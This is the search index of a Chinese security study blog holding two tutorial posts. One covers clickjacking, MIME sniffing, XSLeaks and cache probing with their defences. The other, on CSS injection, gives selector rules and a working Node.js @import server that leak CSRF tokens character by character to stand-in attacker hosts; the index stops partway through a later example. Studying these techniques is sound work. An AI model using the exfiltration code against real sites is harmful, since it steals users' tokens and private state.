[{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/","section":"Delete's blog","summary":"","title":"Delete's blog","type":"page"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/tags/oracle/","section":"Tags","summary":"","title":"Oracle","type":"tags"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/categories/web/","section":"Categories","summary":"","title":"WEB","type":"categories"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/categories/xsleaks/","section":"Categories","summary":"","title":"XSLeaks","type":"categories"},{"content":"","date":"11 September 2025","externalUrl":null,"permalink":"/tags/xsleasks/","section":"Tags","summary":"","title":"XSLeasks","type":"tags"},{"content":"前言 #\r因为中间有一段是讲CORS和CSRF的，对于我而言似乎没这么重要？因为在实战中也很难利用，所以我们直接跳到最后一章学习，被催更了wwww。\nClickJacking #\rClikeJacking的原理其实很简单，透过css嵌套一个页面进一个主页面，例如在A中放一个B页面，可以利用iframe等方法，然后利用css将其的透明度设置为0.001,这个时候如果用户A点击某个按钮，就会点到B页面的按钮，例如这样子clickjacking 范例 ![[PixPin_2025-09-10_22-58-33.gif]] 攻击手法：\n把目标网页嵌入恶意网页之中（透过iframe 或其他类似标签） 在恶意网页上用CSS 把目标网页盖住，让使用者看不见 诱导使用者前往恶意网页并且做出操作（输入或点击等等） 触发目标网页行为，达成攻击 三种防御方式 如果你不想被iframe载入 X-Frame-Options X-Frame-Options: DENY\rContent-Security-Policy: frame-ancestors \u0026#39;none\u0026#39; 如果只允许same-origin载入\nX-Frame-Options: SAMEORIGIN\rContent-Security-Policy: frame-ancestors \u0026#39;self\u0026#39; 如果要用allow list 指定允许的来源\nX-Frame-Options: ALLOW-FROM https://example.com/\rContent-Security-Policy: frame-ancestors https://example.com/ MIME sniffing #\r这个考点似乎之前遇到过,当时记得是让其浏览器自己解析为js，然后写一个js的页面，就可以把flag外带出来，但是主播确实想不起来是哪道题了。 这个漏洞其实就是，在response包中，会包含Content-Type，如果这个不存在，浏览器就会自动识别然后将其改为对应类型，有的时候就算带了这个hearder也会自动识别\n从一个demo开始 #\rconst express = require(\u0026#39;express\u0026#39;);\rconst app = express();\rapp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\rres.write(\u0026#39;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026#39;)\rres.end()\r});\rapp.listen(5555, () =\u0026gt; {\rconsole.log(\u0026#39;Server is running on port 5555\u0026#39;);\r}); 可以看到浏览器自动解析了，但是我们如果换成h2呢？ 在火狐里面是会正常显示的，而在google里面就不会，这个是因为每个浏览器对这个的处理是不一样的，我们可以看一下google是怎么处理的\n// Our HTML sniffer differs slightly from Mozilla. For example, Mozilla will // decide that a document that begins \u0026#34;\u0026lt;!DOCTYPE SOAP-ENV:Envelope PUBLIC \u0026#34; is // HTML, but we will not. #define MAGIC_HTML_TAG(tag) \\ MAGIC_STRING(\u0026#34;text/html\u0026#34;, \u0026#34;\u0026lt;\u0026#34; tag) static const MagicNumber kSniffableTags[] = { // XML processing directive. Although this is not an HTML mime type, we sniff // for this in the HTML phase because text/xml is just as powerful as HTML and // we want to leverage our white space skipping technology. MAGIC_NUMBER(\u0026#34;text/xml\u0026#34;, \u0026#34;\u0026lt;?xml\u0026#34;), // Mozilla // DOCTYPEs MAGIC_HTML_TAG(\u0026#34;!DOCTYPE html\u0026#34;), // HTML5 spec // Sniffable tags, ordered by how often they occur in sniffable documents. MAGIC_HTML_TAG(\u0026#34;script\u0026#34;), // HTML5 spec, Mozilla MAGIC_HTML_TAG(\u0026#34;html\u0026#34;), // HTML5 spec, Mozilla MAGIC_HTML_TAG(\u0026#34;!--\u0026#34;), MAGIC_HTML_TAG(\u0026#34;head\u0026#34;), // HTML5 spec, Mozilla MAGIC_HTML_TAG(\u0026#34;iframe\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;h1\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;div\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;font\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;table\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;a\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;style\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;title\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;b\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;body\u0026#34;), // Mozilla MAGIC_HTML_TAG(\u0026#34;br\u0026#34;), MAGIC_HTML_TAG(\u0026#34;p\u0026#34;), // Mozilla }; // ... // Returns true and sets result if the content appears to be HTML. // Clears have_enough_content if more data could possibly change the result. static bool SniffForHTML(base::StringPiece content, bool* have_enough_content, std::string* result) { // For HTML, we are willing to consider up to 512 bytes. This may be overly // conservative as IE only considers 256. *have_enough_content \u0026amp;= TruncateStringPiece(512, \u0026amp;content); // We adopt a strategy similar to that used by Mozilla to sniff HTML tags, // but with some modifications to better match the HTML5 spec. base::StringPiece trimmed = base::TrimWhitespaceASCII(content, base::TRIM_LEADING); // |trimmed| now starts at first non-whitespace character (or is empty). return CheckForMagicNumbers(trimmed, kSniffableTags, result); } 会检查response 移除空白以后开头的字串是不是符合上面列出的那些HTML 的模式，可以看到一般常见的网页开头\u0026lt;!DOCTYPE html跟\u0026lt;html都有在上面。这也解释了为什么我们前面试过的两个范例中，只有\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;这个范例最后是呈现为HTML\n利用MIME sniffing攻击 #\r这个手法主要是结合某些中间件的特性一起使用，这里用的是Apache2.4，然后在最新版本似乎修了(bao爷说的我不知道)，就是当你上传..png的文件的时候apahce就不会带上response，这个时候你如果写入一个script就可以实现xss等漏洞 可以当Script 载入的content-Type #\r想一下\n\u0026lt;script src=\u0026#34;URL\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; 当URL为什么类型的时候，才会被认为是script载入呢？ 具体可以看到这里\n// Support every script type mentioned in the spec, as it notes that \u0026#34;User // agents must recognize all JavaScript MIME types.\u0026#34; See // https://html.spec.whatwg.org/#javascript-mime-type. const char* const kSupportedJavascriptTypes[] = { \u0026#34;application/ecmascript\u0026#34;, \u0026#34;application/javascript\u0026#34;, \u0026#34;application/x-ecmascript\u0026#34;, \u0026#34;application/x-javascript\u0026#34;, \u0026#34;text/ecmascript\u0026#34;, \u0026#34;text/javascript\u0026#34;, \u0026#34;text/javascript1.0\u0026#34;, \u0026#34;text/javascript1.1\u0026#34;, \u0026#34;text/javascript1.2\u0026#34;, \u0026#34;text/javascript1.3\u0026#34;, \u0026#34;text/javascript1.4\u0026#34;, \u0026#34;text/javascript1.5\u0026#34;, \u0026#34;text/jscript\u0026#34;, \u0026#34;text/livescript\u0026#34;, \u0026#34;text/x-ecmascript\u0026#34;, \u0026#34;text/x-javascript\u0026#34;, }; 可以看到允许很多type进行载入script，这里不多说啦，但是如果设置了\nX-Content-Type-Options: nosniff 的时候，以上就无效了\nXSLeaks #\rXSLeaks全称Cross-site leaks，学习下来其实就是侧信道，利用一些其他的信息进行leak，也对侧信道的概念清晰了一点，举一个例子,有两个房间中间隔着一个门，一边有三个灯泡A,B,C，另外一边是A.B.C的开关，你只有一次机会，打开开关然后去对面查看结果后得到哪个开关是控制哪一个灯泡的，如果按旁路攻击的思路就是，开A灯开1h，然后关闭A等，打开B灯然后进去看，摸一下灯泡看哪个是热的，就可以判断出来了，这个就是侧信道。\nXSLeaks demo1 #\r大家可以用浏览器开启这个网页：https://browserleaks.com/social 就可以检查你是否登录了某个页面，这个的原理就是用到了XSLeaks\n首先，可以通过onerror和onload来判断你是否载入了一张图片\n\u0026lt;img src=\u0026#34;x\u0026#34; onerror=\u0026#34;alert(1)\u0026#34; onload=\u0026#34;alert(\u0026#39;load\u0026#39;)\u0026#34;\u0026gt; 并且大部分网站都有一个特性，就是登录完后会进行自动的跳转，所以我们可以改成这样子\n\u0026lt;img src=\u0026#34;https://medium.com/m/login-redirect?redirectUrl=https%3A%2F%2Fmedium.com%2Ffavicon.ico\u0026#34; onerror=\u0026#34;alert(\u0026#39;Not logged in\u0026#39;)\u0026#34; onload=\u0026#34;alert(\u0026#39;logged in\u0026#39;)\u0026#34;\u0026gt; 如果使用者有登入的话，就会跳转到网站的logo 网址，因为这真的是张图片所以会执行到onload，反之，则会被导到登入页面，而这不是图片所以会到onerror，所以根据这个方法就可判断你是否登录了\n利用状态码的XSLeaks #\r\u0026lt;img\u0026gt;在载入内容时，除了会检查状态码以外，也会检查response 是不是一张图片，因此只能拿来判断「最后载入的是不是图片」。而另外一个标签\u0026lt;script\u0026gt;就不同了，如果response 的状态码是200，那就算内容不是JavaScript，也不会触发onerror事件。\nconst express = require(\u0026#39;express\u0026#39;);\rconst app = express();\rapp.get(\u0026#39;/200\u0026#39;, (req, res) =\u0026gt; {\rres.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39;})\rres.write(\u0026#39;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026#39;)\rres.end()\r});\rapp.get(\u0026#39;/400\u0026#39;, (req, res) =\u0026gt; {\rres.writeHead(400)\rres.end()\r});\rapp.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; {\rres.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/html\u0026#39; })\rres.write(\u0026#39;\u0026lt;script src=\u0026#34;/200\u0026#34; onerror=alert(\u0026#34;200_error\u0026#34;) onload=alert(\u0026#34;200_load\u0026#34;)\u0026gt;\u0026lt;/script\u0026gt;\u0026#39;)\rres.write(\u0026#39;\u0026lt;script src=\u0026#34;/400\u0026#34; onerror=alert(\u0026#34;400_error\u0026#34;) onload=alert(\u0026#34;400_load\u0026#34;)\u0026gt;\u0026lt;/script\u0026gt;\u0026#39;)\rres.end()\r});\rapp.listen(5555, () =\u0026gt; {\rconsole.log(\u0026#39;Server is running on port 5555\u0026#39;);\r}); ![[PixPin_2025-09-11_21-26-18.gif]] 虽然正常弹窗了但是我们看到控制台 依然可以看到报错。 而huli师傅举了一个例子就是Twitter的一个漏洞Twitter ID exposure via error-based side-channel attack 具体就不讲了，挺好玩的。\n其他可以leak的东西 #\r这里举得例子就是frames\nvar win = window.open(\u0026#39;http://localhost:5555\u0026#39;)\r// 等 window 載入完成\rsetTimeout(() =\u0026gt; {\ralert(win.frames.length)\r}, 1000) 如果开启的页面有一个iframe，长度就是1，什么都没有的话就是0。如果一个网站会根据行为的不同，而有不同的iframe 数量的话，我们就可以用这招来侦测。 具体看这里：Patched Facebook Vulnerability Could Have Exposed Private Information About You and Your Friends\nCache probing #\rCache基本上到处都可见，我认为就是让用户的体验感更好，以request来说，比如你已经加载过这个页面了，下次再打开的时候不变的地方就会从Cache中取，这样子加载页面会快很多，而这个手法就是利用缓存来进行攻击，和CPU漏洞Spectre与Meltdown就和Cache有关，举个例子： 假设一个网站如果有登入的话，就会显示欢迎页面，上面有着一张welcome.png，没登入的话就看不到，会导回到登入页面。而这张图片显示以后，就会存在浏览器的Cache中，我们只需要判断这图片的载入时间就可以知道用户有没有登录，这里有一个实际例子： Leaking COVID risk group via XS-Leaks 这里提一下一个地方，就是当你已经加载过所有的资源后，可以使用4xx和5xx让浏览器去删除cache从而可以继续使用这个手法，而利用的时候有时候可以利用waf的报错来进行清除，这个就是大概这个手法的利用方式和场景\n加上error event #\r这个主要是因为我们在利用Cache Probing的时候，是靠加载资源的时间来判断的，但是如果本身的网络就很快，加载资源和Cache的时间差不多的时候，我们就可以利用img标签和error event来攻击\n假设有一个https://app.huli.tw/search?q=abc的页面，会根据搜索结果呈现不同画面，如果有搜索到东西，就会出现https://app.huli.tw/found.png，没搜索到的话就不会有这张图片。 攻击步骤（这里都以huli师傅给出的思路一样，所以看我的和huli师傅的一样）： 首先第一步就是要去除Cahce：\n// 程式碼改寫自 https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels#cache-and-error-events\rlet url = \u0026#39;https://app.huli.tw/found.png\u0026#39;;\r// 這行可以在 URL 後面加上一堆逗號，送出去的 request 的 referrer 就會太大\rhistory.replaceState(1,1,Array(16e3));\r// 發出 request\rawait fetch(url, {cache: \u0026#39;reload\u0026#39;, mode: \u0026#39;no-cors\u0026#39;}); 第二步就是去载入目标网站，将found.png写入到cache中 最后一步就是把网址弄的很长再载入图片\n// 程式碼改寫自 https://github.com/xsleaks/xsleaks/wiki/Browser-Side-Channels#cache-and-error-events\rlet url = \u0026#39;https://app.huli.tw/found.png\u0026#39;;\rhistory.replaceState(1,1,Array(16e3));\rlet img = new Image();\rimg.src = url;\rtry {\rawait new Promise((r, e)=\u0026gt;{img.onerror=e;img.onload=r;});\ralert(\u0026#39;Resource was cached\u0026#39;); // Otherwise it would have errored out\r} catch(e) {\ralert(\u0026#39;Resource was not cached\u0026#39;); // Otherwise it would have loaded\r} 如果图片没有在快取中，那浏览器就会发request 去拿，这时候就会碰到跟第一步一样的状况，因为header 太长所以伺服器回传错误，触发onerror事件。\n反之，如果在快取中的话，浏览器就会直接用快取中的图片，根本不会发request，载入快取中的图片后就会触发onload事件。\nCache Partitioning #\r以上的所有攻击方式都是基于，Cache是共用的，这个时候Chrome新出了一个机制：cache partitioning，快速分区，Cache分区启用之后，快取的key 变得不一样了，从一个URL 变成一个tuple:\ntop-level site current-frame site resource URL 假设在https://app.huli.tw/search?q=abc载入图片https://app.huli.tw/found.png，快取的key 就是： https://huli.tw https://huli.tw https://app.huli.tw/found.png 而若是从另外一个https://localhost:5555/exploit.html的页面载入图片https://app.huli.tw/found.png，快取的key 就是：\nhttp://localhost:5555 http://localhost:5555 https://app.huli.tw/found.png 要三块key都一样才会存取到一起，不然就会分开，但是我们注意到Cache主要还是看site而不是origin，所以如果我们不是从http://localhost:5555发起攻击，而是从https://test.huli.tw发起攻击呢？\nhttps://huli.tw https://huli.tw https://app.huli.tw/found.png 跟从https://app.huli.tw/search?q=abc载入图片是一样的，所以还是可以执行刚刚的cache probing 攻击。\n防御方式之一 #\r最简单的就是same-site cookie，透过把cookie 设置成SameSite=Lax这样子无论是什么标签，都不会带上cookie，除了这个之外还有几种方式可以防御。 第一种是Cross-Origin-Resource-Policy的header，可以控制资源的加载，例如Cross-Origin-Resource-Policy: same-origin 第二种是一个叫做Fetch Metadata 的新机制，它是当网页发出request 时，浏览器会自动加上的header，有以下几个:\nSec-Fetch-Site，发出请求的网站跟目标网站的关系 Sec-Fetch-Mode，发出请求的模式 Sec-Fetch-Dest，请求的目的地 Sec-Fetch-Site的值主要有以下几种：\nsame-origin same-site cross-site none（无法归类在上面的，例如说浏览器从书签点开网站） Sec-Fetch-Mode有这几种：\nsame-origin no-cors cors navigate 第三种的话就是把成功跟失败的状态码都改成200，就无法根据状态码的差别侦测出差异了\n最后 #\r这个是huli师傅写的最后一章了，对于CORS和same-site，csrf的部分我没有写是因为我认为确实触发条件太过于苛刻而且实战中也很难利用，接下来就是开始复现time了，会开一个专栏吧，遇到一个复现一个，积少成多呜呜呜 最后，致敬huli师傅\nReferences: Leaks Wiki huli\u0026rsquo;s blog\n","date":"11 September 2025","externalUrl":null,"permalink":"/posts/%E6%8E%A2%E7%B4%A2%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8day%E5%85%AD/","section":"Posts","summary":"","title":"探索前端安全Day(六)-终章","type":"posts"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/categories/css/","section":"Categories","summary":"","title":"CSS","type":"categories"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/css-inject/","section":"Tags","summary":"","title":"CSS Inject","type":"tags"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/leak/","section":"Tags","summary":"","title":"Leak","type":"tags"},{"content":"","date":"30 August 2025","externalUrl":null,"permalink":"/tags/scrollbar/","section":"Tags","summary":"","title":"Scrollbar","type":"tags"},{"content":"前言 #\r之前我们看到了用HTML进行dom clobbering攻击，那么这次，我们来利用CSS进行Inject吧！\n什么是CSS Injection #\rcss注入其实就和前面的HTML进行dom clobbering一样，就是对css可控的情况下面，利用style标签来进行攻击，不需要用到js和html就可以做到一些事情，并且很多开发者并不会觉得css能进行injection，所以不管在sanitizer还是dompurify，还是什么其他自己写的一些限制，都不会对style进行什么限制，所以还是有危害在的，跟随我的脚步，猛攻！\n利用CSS进行leak #\r两个特性 #\r第一个特性：CSS的属性选择器，可以利用选择器来猜解对应的数据进行leak，比如说input[value^=D]可以筛选开头为D的元素，其中^用来匹配开头$匹配结尾*匹配内容。 第二个特性：CSS本质上会发送Request请求，当我们的background设定了一个url后，CSS就会发送请求。 综合以上这两个特点，我们可以很简单的就知道要如何利用，举个简单的例子\ninput[value^=D]{ background: url(https://Delete.love?love=D) } 当匹配到D为开头，那么CSS就会像我们的Server发送love=D的请求，那我们就知道了某个我们要leak的值的开头就是D。 好，既然我们知道了如何去得到我们要的值，那么我们现在只需要确定我们需要leak什么值，一般来说我们的攻击都是要扩大范围，如何从点到面，从面到体，那么从打点思路来讲，最好不过的就是一个admin后台，所以我们目标定为，leak admin token\nhidden input #\r大多数页面，我们用户的token都是被写到hidden里面的，那么我们前面的选择器就没办法直接选择到对应的元素，例如\n\u0026lt;form action=\u0026#34;/action\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;hidden\u0026#34; name=\u0026#34;csrf-token\u0026#34; value=\u0026#34;DeleteXSS\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;username\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34;\u0026gt; \u0026lt;/form\u0026gt; 这个时候，我们如果用\n[input name=\u0026#34;csrf-token\u0026#34;][value^=D]{ background:url(http://delete.love?love=D) } 是取不到的，这里我还是实操一下，不然说服性不强 然后打开页面后 可以看到正常写的可以发送请求，但是我们尝试换成hidden 可以看到请求并不会发过来，因为他并不会显示，对应他的background就没必要request，所以会发生这种情况，如何解决？\n第一种情况：当我们leak的值后面有别的标签在我们可以让后面的标签进行background的request即可 input[name=\u0026#34;csrf-token\u0026#34;][value^=\u0026#34;D\u0026#34;] + input { background: url(https://example.com?q=a) } 后面的+input取到的就是下一个元素， 第二种情况：那如果我们要leak的值在最后面，没有标签了怎么办？这个时候我们可以看到这里caniuse 我们可以利用has的选择器直接抓取，像这样 我们就可以随便抓到我们要的值了（有人应该发现了换值了因为怕是用到前面的方法请求得到的，嗯！严谨一点） meta #\r同上面一样，可以设置为：\u0026lt;meta name=\u0026quot;csrf-token\u0026quot; content=\u0026quot;abc123\u0026quot;\u0026gt;，并且这里也可以利用has去得到token\nhtml:has(meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;]) { background: url(https://example.com?q=a); } 然后另外一个方法是，虽然meta和hidden都是不可见的，但是通过css我们可以控制meta为可见，再利用前面的方法即可。\nhead, meta { display: block; } meta[name=\u0026#34;csrf-token\u0026#34;][content^=\u0026#34;a\u0026#34;] { background: url(https://example.com?q=a); } 这里记得也要把head也一起设置了因为head标签预设display:none Question #\r对于以上的一些手法，不少人也许会提出疑问，csrf-token可能会动态更新，我们如何一次性拿到所有的字符串？难道只能一个一个去leak吗，当token很长的时候，是不是需要很长时间？又或者是我们有没有其他可以leak的东西？那么接下来，我们来研究这些东西\n一次性拿到你需要的数据 #\r关于这个问题，我们可以看一下这份报告：CSS Injection Attacks Pepe Vila指出可以利用@import来引入style，具体的思路就是，在你的server端写下类似这样子的css文件\n@import url(https://vpsip.com/payload?len=1) @import url(https://vpsip.com/payload?len=2) @import url(https://vpsip.com/payload?len=3) @import url(https://vpsip.com/payload?len=4) @import url(https://vpsip.com/payload?len=5) @import url(https://vpsip.com/payload?len=6) @import url(https://vpsip.com/payload?len=7) @import url(https://vpsip.com/payload?len=8) 然后只需要在攻击的时候import一个\n@import url(https://vpsip.com/start?len=8) server端就会一个个去leak对应的值，并且这个样子就不需要重新加载新的东西，所以也不用担心刷新后某个值会变了。 现在举个例子。\n\u0026lt;!doctype html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div\u0026gt;\u0026lt;article\u0026gt;\u0026lt;div\u0026gt;\u0026lt;p\u0026gt;\u0026lt;div\u0026gt;\u0026lt;div\u0026gt;\u0026lt;div\u0026gt;\u0026lt;div\u0026gt;\u0026lt;div\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; value=\u0026#34;Deletefvv\u0026#34;\u0026gt; \u0026lt;style\u0026gt; @import url(\u0026#39;//vpsip:7777/start?\u0026#39;); \u0026lt;/style\u0026gt; 脚本\nconst http = require(\u0026#39;http\u0026#39;);\rconst url = require(\u0026#39;url\u0026#39;);\rconst port = 5001;\rconst HOSTNAME = \u0026#34;http://localhost:5001\u0026#34;;\rconst DEBUG = false;\rvar prefix = \u0026#34;\u0026#34;, postfix = \u0026#34;\u0026#34;;\rvar pending = [];\rvar stop = false, ready = 0, n = 0;\rconst requestHandler = (request, response) =\u0026gt; {\rlet req = url.parse(request.url, url);\rlog(\u0026#39;\\treq: %s\u0026#39;, request.url);\rif (stop) return response.end();\rswitch (req.pathname) {\rcase \u0026#34;/start\u0026#34;:\rgenResponse(response);\rbreak;\rcase \u0026#34;/leak\u0026#34;:\rresponse.end();\rif (req.query.pre \u0026amp;\u0026amp; prefix !== req.query.pre) {\rprefix = req.query.pre;\r} else if (req.query.post \u0026amp;\u0026amp; postfix !== req.query.post) {\rpostfix = req.query.post;\r} else {\rbreak;\r}\rif (ready == 2) {\rgenResponse(pending.shift());\rready = 0;\r} else {\rready++;\rlog(\u0026#39;\\tleak: waiting others...\u0026#39;);\r}\rbreak;\rcase \u0026#34;/next\u0026#34;:\rif (ready == 2) {\rgenResponse(respose);\rready = 0;\r} else {\rpending.push(response);\rready++;\rlog(\u0026#39;\\tquery: waiting others...\u0026#39;);\r}\rbreak;\rcase \u0026#34;/end\u0026#34;:\rstop = true;\rconsole.log(\u0026#39;[+] END: %s\u0026#39;, req.query.token);\rdefault:\rresponse.end();\r}\r}\rconst genResponse = (response) =\u0026gt; {\rconsole.log(\u0026#39;...pre-payoad: \u0026#39; + prefix);\rconsole.log(\u0026#39;...post-payoad: \u0026#39; + postfix);\rlet css = \u0026#39;@import url(\u0026#39;+ HOSTNAME + \u0026#39;/next?\u0026#39; + Math.random() + \u0026#39;);\u0026#39; +\r[0,1,2,3,4,5,6,7,8,9,\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;].map(e =\u0026gt; (\u0026#39;input[value$=\u0026#34;\u0026#39; + e + postfix + \u0026#39;\u0026#34;]{--e\u0026#39;+n+\u0026#39;:url(\u0026#39; + HOSTNAME + \u0026#39;/leak?post=\u0026#39; + e + postfix + \u0026#39;)}\u0026#39;)).join(\u0026#39;\u0026#39;) +\r\u0026#39;div \u0026#39;.repeat(n) + \u0026#39;input{background:var(--e\u0026#39;+n+\u0026#39;)}\u0026#39; +\r[0,1,2,3,4,5,6,7,8,9,\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;,\u0026#39;c\u0026#39;,\u0026#39;d\u0026#39;,\u0026#39;e\u0026#39;,\u0026#39;f\u0026#39;].map(e =\u0026gt; (\u0026#39;input[value^=\u0026#34;\u0026#39; + prefix + e + \u0026#39;\u0026#34;]{--s\u0026#39;+n+\u0026#39;:url(\u0026#39; + HOSTNAME + \u0026#39;/leak?pre=\u0026#39; + prefix + e +\u0026#39;)}\u0026#39;)).join(\u0026#39;\u0026#39;) +\r\u0026#39;div \u0026#39;.repeat(n) + \u0026#39;input{border-image:var(--s\u0026#39;+n+\u0026#39;)}\u0026#39; +\r\u0026#39;input[value=\u0026#39;+ prefix + postfix + \u0026#39;]{list-style:url(\u0026#39; + HOSTNAME + \u0026#39;/end?token=\u0026#39; + prefix + postfix + \u0026#39;\u0026amp;)};\u0026#39;;\rresponse.writeHead(200, { \u0026#39;Content-Type\u0026#39;: \u0026#39;text/css\u0026#39;});\rresponse.write(css);\rresponse.end();\rn++;\r}\rconst server = http.createServer(requestHandler)\rserver.listen(port, (err) =\u0026gt; {\rif (err) {\rreturn console.log(\u0026#39;[-] Error: something bad happened\u0026#39;, err);\r}\rconsole.log(\u0026#39;[+] Server is listening on %d\u0026#39;, port);\r})\rfunction log() {\rif (DEBUG) console.log.apply(console, arguments);\r} 其实就是不断leak，思路是和上面是一致的 可以看出来leak出来了。 所以只要用@import这个CSS 的功能，就可以做到「不重新载入页面，但可以动态载入新的style」，进而偷取后面的每一个字符。\n那么对于leak速度的问题，我们可以取双向爆破的方法，也就是，一个从^开始一个从$开始，从而将效率翻倍，但是这里要记住一个点就是，要用到不同的属性，一个用background，另一个要用border-background，不然会冲突只发出一个request，像这样\ninput[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;a\u0026#34;] { background: url(https://b.myserver.com/leak?q=a) } input[name=\u0026#34;secret\u0026#34;][value^=\u0026#34;b\u0026#34;] { background: url(https://b.myserver.com/leak?q=b) } // ... input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;a\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=a) } input[name=\u0026#34;secret\u0026#34;][value$=\u0026#34;b\u0026#34;] { border-background: url(https://b.myserver2.com/suffix?q=b) } leak其他的数据 #\r除了可以拿到标签里面的数据，我们能否取到别的数据？比如script的程序？又或者是页面上的内容。\nunicode-range #\r在CSS 里面，有一个属性叫做「unicode-range」，可以针对不同的字元，载入不同的字体。 举一个例子MDN的例子\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;Ampersand\u0026#34;; src: local(\u0026#34;Times New Roman\u0026#34;); unicode-range: U+26; } div { font-size: 4em; font-family: Ampersand, Helvetica, sans-serif; } \u0026lt;/style\u0026gt; \u0026lt;div\u0026gt;Me \u0026amp; You = Us\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 因为设置的unicode-range是U+26，而div标签中U+26表示的是\u0026amp;所以只有\u0026amp;会用特殊字体显示出来。 利用\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;f1\u0026#34;; src: url(https://myserver.com?q=1); unicode-range: U+31; } @font-face { font-family: \u0026#34;f2\u0026#34;; src: url(https://myserver.com?q=2); unicode-range: U+32; } @font-face { font-family: \u0026#34;f3\u0026#34;; src: url(https://myserver.com?q=3); unicode-range: U+33; } @font-face { font-family: \u0026#34;fa\u0026#34;; src: url(https://myserver.com?q=a); unicode-range: U+61; } @font-face { font-family: \u0026#34;fb\u0026#34;; src: url(https://myserver.com?q=b); unicode-range: U+62; } @font-face { font-family: \u0026#34;fc\u0026#34;; src: url(https://myserver.com?q=c); unicode-range: U+63; } div { font-size: 4em; font-family: f1, f2, f3, fa, fb, fc; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;ca31a\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 是可以做到的，但是问题就是我们可以看到他是乱序的，所以其实也很难利用起来，所以请看下面\n字体高度差异+first-line+scrollbar #\r首先，我们要知道，不同的字体他的每个字符的高度是不一样的，有一个叫做「Comic Sans MS」的字体，高度就比另一个「Courier New」高。\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 30px; height: 40px; width: 100px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } \u0026lt;/style\u0026gt; Secret: \u0026lt;div\u0026gt;DBC\u0026lt;/div\u0026gt; \u0026lt;div\u0026gt;ABC\u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; 这样子应该可以很直观的就能看到，当我们设定了字体高度为30px，Comic Sans MS为45px，文字区块的高度设成40px，发现了没有，在下面这个字符串中出现了scrollbar，那么这个有什么用呢？我们css可以对scrollbar进行设定，可以和之前一样加入一个background：\ndiv::-webkit-scrollbar:vertical { background: url(https://myserver.com?q=a); } 这么一来，是不是触发了scrollbar的就会发送request到server，从而我们就可以利用了，因此，如果一直重复载入不同字体，那server 就能知道画面上有什么字符，这点跟刚刚我们用unicode-range能做到的事情是一样的。 那么我们如何和之前一样得到顺序的secret呢？我们可以让div的宽度缩小到只能显示一个字符的情况，再搭配::first-line来对第一行的样式进行调整。\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;body\u0026gt; \u0026lt;style\u0026gt; @font-face { font-family: \u0026#34;fa\u0026#34;; src:local(\u0026#39;Comic Sans MS\u0026#39;); font-style:monospace; unicode-range: U+41; } div { font-size: 0px; height: 40px; width: 20px; font-family: fa, \u0026#34;Courier New\u0026#34;; letter-spacing: 0px; word-break: break-all; overflow-y: auto; overflow-x: hidden; } div::first-line{ font-size: 30px; } \u0026lt;/style\u0026gt; Secret: 